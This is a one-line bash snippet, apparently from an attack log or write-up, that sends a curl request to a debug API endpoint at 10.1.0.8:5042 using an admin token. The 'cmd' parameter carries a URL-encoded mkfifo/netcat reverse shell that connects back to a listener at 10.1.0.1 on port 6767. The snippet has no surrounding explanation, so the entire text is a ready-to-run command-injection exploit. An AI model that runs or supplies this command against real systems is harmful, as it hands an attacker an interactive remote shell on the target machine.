```bash
curl "10.1.0.8:5042/api/debug?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%20%7Cnc%2010.1.0.1%206767%20%3E%2Ftmp%2Ff&token=$ADMIN_TOKEN"

```